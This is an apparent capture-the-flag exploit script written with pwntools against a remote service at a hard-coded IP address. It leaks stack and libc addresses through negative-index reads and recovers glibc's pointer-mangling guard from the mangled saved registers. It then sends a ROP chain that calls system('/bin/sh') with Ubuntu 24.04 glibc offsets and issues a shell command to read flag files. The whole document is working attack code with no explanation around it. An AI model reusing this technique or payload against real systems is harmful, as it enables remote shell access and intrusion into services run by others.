#!/usr/bin/env python3
from pwn import *
import argparse
import re


HOST = "35.194.108.145"
PORT = 33137

MAIN = 0x401250
LIBC_INIT_RET = 0x2A181

# Ubuntu 24.04 glibc offsets
RET = 0x2882F
POP_RDI = 0x10F78B
BINSH = 0x1CB42F
SYSTEM = 0x58750

FLAG_CMD = b"cat /app/flag-* /flag-* 2>/dev/null; exit\n"


def ror(value: int, bits: int) -> int:
    return ((value >> bits) | ((value & ((1 << bits) - 1)) << (64 - bits))) & ((1 << 64) - 1)


def u64p(data: bytes) -> int:
    return u64(data.ljust(8, b"\x00"))


def last_bye_body(blob: bytes) -> bytes | None:
    idx = blob.rfind(b"bye! ")
    if idx == -1:
        return None
    return blob[idx + 5 : -1] if blob.endswith(b"\n") else blob[idx + 5 :]


def build_stage1() -> bytes:
    return b"A" * 0x10 + b"".join(p64(x) for x in [0, MAIN, MAIN, MAIN, MAIN, MAIN, MAIN, MAIN]) + b"\n"


def build_stage2(libc_base: int) -> bytes:
    chain = [
        0,
        MAIN,
        libc_base + RET,
        libc_base + POP_RDI,
        libc_base + BINSH,
    ]
    return b"B" * 0x10 + b"".join(p64(x) for x in chain) + p64(libc_base + SYSTEM)[:7] + b"\n"


def run_once(io) -> str | None:
    io.recvline(timeout=2)

    io.sendline(b"-8")
    io.send(build_stage1())
    io.recvrepeat(0.1)

    io.sendline(b"-145")
    leak1 = io.recvrepeat(0.3)

    io.sendline(b"-145")
    io.recvrepeat(0.3)

    io.sendline(b"-177")
    leak3 = io.recvrepeat(0.5)

    body1 = last_bye_body(leak1)
    body3 = last_bye_body(leak3)
    if body1 is None or body3 is None or len(body1) < 6 or len(body3) < 16:
        return None

    leak145 = u64p(body1[:6])
    mangled_rsp = u64(body3[:8])
    mangled_pc = u64(body3[8:16])

    saved_rsp = leak145 - 0x118
    guard = ror(mangled_rsp, 17) ^ saved_rsp
    rip = ror(mangled_pc, 17) ^ guard
    libc_base = rip - LIBC_INIT_RET

    io.sendline(b"-8")
    io.send(build_stage2(libc_base))
    io.recvrepeat(0.3)

    io.send(FLAG_CMD)
    out = io.recvrepeat(1.0)
    match = re.search(rb"tkbctf\{[^\n}]+\}", out)
    return match.group().decode() if match else None


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=HOST)
    parser.add_argument("--port", default=PORT, type=int)
    parser.add_argument("--attempts", default=20, type=int)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    context.log_level = "debug" if args.debug else "error"

    for attempt in range(1, args.attempts + 1):
        io = remote(args.host, args.port)
        try:
            flag = run_once(io)
            if flag:
                print(flag)
                return
        except EOFError:
            pass
        finally:
            io.close()

    raise SystemExit("exploit failed")


if __name__ == "__main__":
    main()
